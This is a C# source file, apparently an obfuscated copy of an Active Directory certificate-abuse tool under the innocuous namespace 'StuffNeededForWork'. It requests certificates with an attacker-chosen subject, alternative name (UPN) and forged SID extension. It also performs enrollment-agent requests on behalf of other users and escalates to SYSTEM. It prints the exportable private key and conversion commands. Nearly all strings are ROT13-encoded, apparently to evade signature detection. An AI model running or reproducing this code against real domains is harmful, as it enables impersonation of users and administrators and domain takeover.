//start
using System.Text;
using System.Linq;
using System;
﻿
using System.DirectoryServices.AccountManagement;
using CERTENROLLLib;
using CERTCLILib;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.IO;
using System.Security.Cryptography;
using System.Security.Principal;
using StuffNeededForWork.Lib;

namespace StuffNeededForWork
{
    class Cert
    {

        private const int CC_DEFAULTCONFIG = 0;
        private const int CC_UIPICKCONFIG = 0x1;
        private const int CR_IN_BASE64 = 0x1;
        private const int CR_IN_FORMATANY = 0;
        private const int CR_IN_PKCS10 = 0x100;
        private const int CR_DISP_ISSUED = 0x3;
        private const int CR_DISP_UNDER_SUBMISSION = 0x5;
        private const int CR_OUT_BASE64 = 0x1;
        private const int CR_OUT_CHAIN = 0x100;

        class CertificateRequest
        {
            public CertificateRequest(string request, string privateKeyPem)
            {
                Request = request;
                PrivateKeyPem = privateKeyPem;
            }

            public string Request { get; set; }
            public string PrivateKeyPem { get; set; }

        }

        private static CertificateRequest CreateCertRequestMessage(string templateName, bool machineContext = false, string subjectName = "", string altName = "", string sidExtension = "")
        {
            if (String.IsNullOrEmpty(subjectName))
            {
                if (machineContext)
                {
                    subjectName = GetCurrentComputerDN();
                    Console.WriteLine(new string("[*] Ab fhowrpg anzr fcrpvsvrq, hfvat pheerag znpuvar nf fhowrpg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                }
                else
                {
                    if (WindowsIdentity.GetCurrent().IsSystem)
                    {
                        Console.WriteLine(new string("\a[!] JNEAVAT: Lbh ner pheeragyl ehaavat nf FLFGRZ. Lbh znl jnag gb hfr gur /znpuvar nethzrag gb hfr gur znpuvar nppbhag vafgrnq.".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    }

                    subjectName = GetCurrentUserDN();
                    Console.WriteLine(new string("[*] Ab fhowrpg anzr fcrpvsvrq, hfvat pheerag pbagrkg nf fhowrpg.".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                }
            }

            Console.WriteLine($"\r\n[*] Template                : {templateName}");
            Console.WriteLine($"[*] Subject                 : {subjectName}");
            if (!String.IsNullOrEmpty(altName))
            {
                Console.WriteLine($"[*] AltName                 : {altName}");
            }
            if (!String.IsNullOrEmpty(sidExtension))
            {
                Console.WriteLine($"[*] SidExtension            : {sidExtension}");
            }

            var privateKey = CreatePrivateKey(machineContext);

            var privateKeyBase64 = privateKey.Export(new string("CEVINGROYBO".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), EncodingType.XCN_CRYPT_STRING_BASE64);
            var privateKeyPEM = ConvertToPEM(privateKeyBase64);

            var objPkcs10 = new CX509CertificateRequestPkcs10();
            var context = machineContext
                ? X509CertificateEnrollmentContext.ContextMachine
                : X509CertificateEnrollmentContext.ContextUser;

            objPkcs10.InitializeFromPrivateKey(context, privateKey, templateName);

            var objDN = new CX500DistinguishedName();

            try
            {
                objDN.Encode(subjectName, X500NameFlags.XCN_CERT_NAME_STR_NONE);
            }
            catch
            {
                objDN.Encode(subjectName, X500NameFlags.XCN_CERT_NAME_STR_SEMICOLON_FLAG);
            }

            objPkcs10.Subject = objDN;

            if (!String.IsNullOrEmpty(altName))
            {

                var names = new CAlternativeNamesClass();
                var altnames = new CX509ExtensionAlternativeNamesClass();
                var name = new CAlternativeNameClass();

                name.InitializeFromString(AlternativeNameType.XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME, altName);
                names.Add(name);
                altnames.InitializeEncode(names);
                objPkcs10.X509Extensions.Add((CX509Extension)altnames);

                var altNamePair = new CX509NameValuePair();
                altNamePair.Initialize(new string("FNA".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), $"upn={altName}");
                objPkcs10.NameValuePairs.Add(altNamePair);

                if(!String.IsNullOrEmpty(sidExtension)) {
                    var extBytes = StuffNeededForWork.Lib.CertSidExtension.EncodeSidExtension(new SecurityIdentifier(sidExtension));
                    var oid = new CObjectId();
                    oid.InitializeFromValue(new string("1.3.6.1.4.1.311.25.2".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    var sidExt = new CX509Extension();
                    sidExt.Initialize(oid, EncodingType.XCN_CRYPT_STRING_BASE64, Convert.ToBase64String(extBytes));
                    objPkcs10.X509Extensions.Add(sidExt);
                }
            }

            var objEnroll = new CX509Enrollment();
            objEnroll.InitializeFromRequest(objPkcs10);
            var base64request = objEnroll.CreateRequest(EncodingType.XCN_CRYPT_STRING_BASE64);

            return new CertificateRequest(base64request, privateKeyPEM);
        }

        private static IX509PrivateKey CreatePrivateKey(bool machineContext)
        {
            var cspInfo = new CCspInformations();
            cspInfo.AddAvailableCsps();

            var privateKey = new CX509PrivateKey
            {
                Length = 2048,
                KeySpec = X509KeySpec.XCN_AT_SIGNATURE,
                KeyUsage = X509PrivateKeyUsageFlags.XCN_NCRYPT_ALLOW_ALL_USAGES,
                MachineContext = machineContext,
                ExportPolicy = X509PrivateKeyExportFlags.XCN_NCRYPT_ALLOW_EXPORT_FLAG,
                CspInformations = cspInfo
            };
            privateKey.Create();

            return privateKey;
        }


        private static CertificateRequest CreateCertRequestOnBehalfMessage(string templateName, string onBehalfUser, string signerCertPath, string signerCertPassword, bool machineContext = false)
        {
            if (String.IsNullOrEmpty(signerCertPath))
                throw new Exception(new string("fvtarePregCngu vf rzcgl".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

            if (!File.Exists(signerCertPath))
                throw new Exception($"signerCertPath '{signerCertPath}' doesn't exist!");

            Console.WriteLine($"\r\n[*] Template                : {templateName}");
            Console.WriteLine($"[*] On Behalf Of            : {onBehalfUser}");

            X509Certificate2? cert = null;

            var privateKey = CreatePrivateKey(machineContext);

            var privateKeyBase64 = privateKey.Export(new string("CEVINGROYBO".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), EncodingType.XCN_CRYPT_STRING_BASE64);
            var privateKeyPEM = ConvertToPEM(privateKeyBase64);

            var objPkcs10 = new CX509CertificateRequestPkcs10();
            var context = machineContext
                ? X509CertificateEnrollmentContext.ContextMachine
                : X509CertificateEnrollmentContext.ContextUser;

            objPkcs10.InitializeFromPrivateKey(context, privateKey, templateName);
            objPkcs10.Encode();

            var pkcs7 = new CX509CertificateRequestPkcs7();
            pkcs7.InitializeFromInnerRequest(objPkcs10);
            pkcs7.RequesterName = onBehalfUser;

            var signer = new CSignerCertificate();

            string base64request;
            try
            {
                cert = new X509Certificate2(signerCertPath, signerCertPassword);

                var store = new X509Store(StoreName.My);
                store.Open(OpenFlags.ReadWrite);
                store.Add(cert);

                signer.Initialize(false, X509PrivateKeyVerify.VerifyNone, EncodingType.XCN_CRYPT_STRING_HEXRAW, cert.Thumbprint);

                pkcs7.SignerCertificate = signer;

                var objEnroll = new CX509Enrollment();
                objEnroll.InitializeFromRequest(pkcs7);
                base64request = objEnroll.CreateRequest(EncodingType.XCN_CRYPT_STRING_BASE64);

                store.Remove(cert);
            }
            finally
            {
                if (cert != null)
                {
                    cert.Reset();
                    cert = null;
                }
            }

            return new CertificateRequest(base64request, privateKeyPEM);
        }


        //      CA format example: new string(@"qp.gurfuver.ybpny\\gurfuver-QP-PN".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())
        public static int SendCertificateRequest(string CA, string message)
        {
            var objCertRequest = new CCertRequest();
            var iDisposition = objCertRequest.Submit(
                    CR_IN_BASE64 | CR_IN_FORMATANY,
                    message,
                    string.Empty,
                    CA);

            switch (iDisposition)
            {
                case CR_DISP_ISSUED:
                    Console.WriteLine(new string("\\e\a[*] PN Erfcbafr             : Gur pregvsvpngr unq orra vffhrq.".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    break;
                case CR_DISP_UNDER_SUBMISSION:
                    Console.WriteLine(new string("\\e\a[*] PN Erfcbafr             : Gur pregvsvpngr vf fgvyy craqvat.".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    break;
                default:
                    Console.WriteLine("\r\n[!] CA Response             : The submission failed: {0}", objCertRequest.GetDispositionMessage());
                    Console.WriteLine("[!] Last status             : 0x{0:X}", (uint)objCertRequest.GetLastStatus());
                    break;
            }
            return objCertRequest.GetRequestId();
        }


        public static string DownloadCert(string CA, int requestId)
        {
            TextWriter s = new StringWriter();

            var objCertRequest = new CCertRequest();
            var iDisposition = objCertRequest.RetrievePending(requestId, CA);

            if (iDisposition == CR_DISP_ISSUED)
            {
                var cert = objCertRequest.GetCertificate(CR_OUT_BASE64);

                s.WriteLine(new string("-----ORTVA PREGVSVPNGR-----".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                s.Write(cert);
                s.WriteLine(new string("-----RAQ PREGVSVPNGR-----".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            }
            else
            {
                throw new Exception($"Cert not yet issued yet! (iDisposition: {iDisposition})");
            }

            return s.ToString();
        }


        public static string DownloadAndInstallCert(string CA, int requestId, X509CertificateEnrollmentContext context)
        {
            TextWriter outputStream = new StringWriter();

            var objCertRequest = new CCertRequest();
            var iDisposition = objCertRequest.RetrievePending(requestId, CA);

            if (iDisposition != CR_DISP_ISSUED)
                throw new Exception($"[X] Cert not yet issued! (iDisposition: {iDisposition})");
            
            var cert = objCertRequest.GetCertificate(CR_OUT_BASE64);

            outputStream.WriteLine(new string("-----ORTVA PREGVSVPNGR-----".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            outputStream.Write(cert);
            outputStream.WriteLine(new string("-----RAQ PREGVSVPNGR-----".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

            var objEnroll = new CX509Enrollment();
            objEnroll.Initialize(context);
            objEnroll.InstallResponse(
                InstallResponseRestrictionFlags.AllowUntrustedRoot,
                cert,
                EncodingType.XCN_CRYPT_STRING_BASE64,
                null);
            Console.WriteLine(new string("[*] Pregvsvpngrf vafgnyyrq!".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

            return outputStream.ToString();
        }


        public static void RequestCert(string CA, bool machineContext = false, string templateName = "User", string subject = "", string altName = "", string sidExtension = "", bool install = false)
        {
            if (machineContext && !WindowsIdentity.GetCurrent().IsSystem)
            {
                Console.WriteLine(new string("[*] Ryringvat gb FLFGRZ pbagrkg sbe znpuvar preg erdhrfg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                Elevator.GetSystem(() => RequestCert(CA, machineContext, templateName, subject, altName, sidExtension, install));
                return;
            }

            var userName = WindowsIdentity.GetCurrent().Name;
            Console.WriteLine($"\r\n[*] Current user context    : {userName}");

            var csr = CreateCertRequestMessage(templateName, machineContext, subject, altName, sidExtension);


            Console.WriteLine($"\r\n[*] Certificate Authority   : {CA}");


            int requestID;
            try
            {
                requestID = SendCertificateRequest(CA, csr.Request);

                Console.WriteLine($"[*] Request ID              : {requestID}");

                Thread.Sleep(3000);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[X] Error sending the certificate request: {e}");
                return;
            }

            Console.WriteLine(new string("\\e\a[*] preg.crz         :\\e\a".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            Console.Write(csr.PrivateKeyPem);

            try
            {
                var certPemString = install
                    ? DownloadAndInstallCert(CA, requestID, X509CertificateEnrollmentContext.ContextUser)
                    : DownloadCert(CA, requestID);

                Console.WriteLine(certPemString);
            }
            catch (Exception e)
            {
                Console.WriteLine(new string("\\e\a[K] Reebe qbjaybnqvat pregvsvpngr: ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) + e.Message);
            }

            Console.WriteLine(
                    new string("\\e\a[*] Pbaireg jvgu: bcraffy cxpf12 -va preg.crz -xrlrk -PFC \"Zvpebfbsg Raunaprq Pelcgbtencuvp Cebivqre i1.0\" -rkcbeg -bhg preg.csk\\e\a".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
        }


        public static void RequestCertOnBehalf(string CA, string templateName, string onBehalfUser, string signerCertPath, string signerCertPassword, bool machineContext = false)
        {
            if (machineContext && !WindowsIdentity.GetCurrent().IsSystem)
            {
                Console.WriteLine(new string("[*] Ryringvat gb FLFGRZ pbagrkg sbe znpuvar preg erdhrfg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                Elevator.GetSystem(() => RequestCertOnBehalf(CA, templateName, onBehalfUser, signerCertPath, signerCertPassword, machineContext));
                return;
            }

            var userName = WindowsIdentity.GetCurrent().Name;
            Console.WriteLine($"\r\n[*] Current user context    : {userName}");

            var csr = CreateCertRequestOnBehalfMessage(templateName, onBehalfUser, signerCertPath, signerCertPassword, machineContext);

            Console.WriteLine($"\r\n[*] Certificate Authority   : {CA}");

            int requestID;
            try
            {
                requestID = SendCertificateRequest(CA, csr.Request);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[X] Error sending the certificate request: {e}");
                return;
            }


            Console.WriteLine($"[*] Request ID              : {requestID}");

            Thread.Sleep(3000);

            try
            {
                var certPemString = DownloadCert(CA, requestID);

                Console.WriteLine(new string("\\e\a[*] preg.crz         :\\e\a".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                Console.Write(csr.PrivateKeyPem);
                Console.WriteLine(certPemString);
                Console.WriteLine(
                    new string("\\e\a[*] Pbaireg jvgu: bcraffy cxpf12 -va preg.crz -xrlrk -PFC \"Zvpebfbsg Raunaprq Pelcgbtencuvp Cebivqre i1.0\" -rkcbeg -bhg preg.csk\\e\a".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            }
            catch (Exception e)
            {
                Console.WriteLine(new string("[K] Reebe qbjaybnqvat pregvsvpngr: ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) + e);
            }

        }

        public static string ConvertToPEM(string privKeyStr)
        {
            var rsa = new RSACryptoServiceProvider();
            var CryptoKey = Convert.FromBase64String(privKeyStr);
            rsa.ImportCspBlob(CryptoKey);

            return ExportPrivateKey(rsa);
        }

        private static string ExportPrivateKey(RSACryptoServiceProvider csp)
        {
            if (csp.PublicOnly) throw new ArgumentException(new string("PFC qbrf abg pbagnva n cevingr xrl".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("pfc".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            TextWriter outputStream = new StringWriter();

            var parameters = csp.ExportParameters(true);

            using var stream = new MemoryStream();
            var writer = new BinaryWriter(stream);
            writer.Write((byte)0x30); // SEQUENCE
            using (var innerStream = new MemoryStream())
            {
                var innerWriter = new BinaryWriter(innerStream);
                EncodeIntegerBigEndian(innerWriter, new byte[] { 0x00 }); // Version
                EncodeIntegerBigEndian(innerWriter, parameters.Modulus);
                EncodeIntegerBigEndian(innerWriter, parameters.Exponent);
                EncodeIntegerBigEndian(innerWriter, parameters.D);
                EncodeIntegerBigEndian(innerWriter, parameters.P);
                EncodeIntegerBigEndian(innerWriter, parameters.Q);
                EncodeIntegerBigEndian(innerWriter, parameters.DP);
                EncodeIntegerBigEndian(innerWriter, parameters.DQ);
                EncodeIntegerBigEndian(innerWriter, parameters.InverseQ);
                var length = (int)innerStream.Length;
                EncodeLength(writer, length);
                writer.Write(innerStream.GetBuffer(), 0, length);
            }

            var base64 = Convert.ToBase64String(stream.GetBuffer(), 0, (int)stream.Length).ToCharArray();
            outputStream.WriteLine(new string("-----ORTVA EFN CEVINGR XRL-----".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            
            for (var i = 0; i < base64.Length; i += 64)
            {
                outputStream.WriteLine(base64, i, Math.Min(64, base64.Length - i));
            }
            outputStream.WriteLine(new string("-----RAQ EFN CEVINGR XRL-----".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

            return outputStream.ToString();
        }

        private static void EncodeLength(BinaryWriter stream, int length)
        {
            if (length < 0) throw new ArgumentOutOfRangeException(new string("yratgu".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("Yratgu zhfg or aba-artngvir".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            if (length < 0x80)
            {
                stream.Write((byte)length);
            }
            else
            {
                var temp = length;
                var bytesRequired = 0;
                while (temp > 0)
                {
                    temp >>= 8;
                    bytesRequired++;
                }
                stream.Write((byte)(bytesRequired | 0x80));
                for (var i = bytesRequired - 1; i >= 0; i--)
                {
                    stream.Write((byte)(length >> (8 * i) & 0xff));
                }
            }
        }

        private static void EncodeIntegerBigEndian(BinaryWriter stream, byte[] value, bool forceUnsigned = true)
        {
            stream.Write((byte)0x02); // INTEGER
            var prefixZeros = 0;
            for (var i = 0; i < value.Length; i++)
            {
                if (value[i] != 0) break;
                prefixZeros++;
            }
            if (value.Length - prefixZeros == 0)
            {
                EncodeLength(stream, 1);
                stream.Write((byte)0);
            }
            else
            {
                if (forceUnsigned && value[prefixZeros] > 0x7f)
                {
                    EncodeLength(stream, value.Length - prefixZeros + 1);
                    stream.Write((byte)0);
                }
                else
                {
                    EncodeLength(stream, value.Length - prefixZeros);
                }
                for (var i = prefixZeros; i < value.Length; i++)
                {
                    stream.Write(value[i]);
                }
            }
        }

        private static string GetCurrentUserDN()
        {
            return UserPrincipal.Current.DistinguishedName.Replace(",", ", ");
        }


        private static string GetCurrentComputerDN()
        {
            return $"CN={System.Net.Dns.GetHostEntry("").HostName}";
        }
    }
}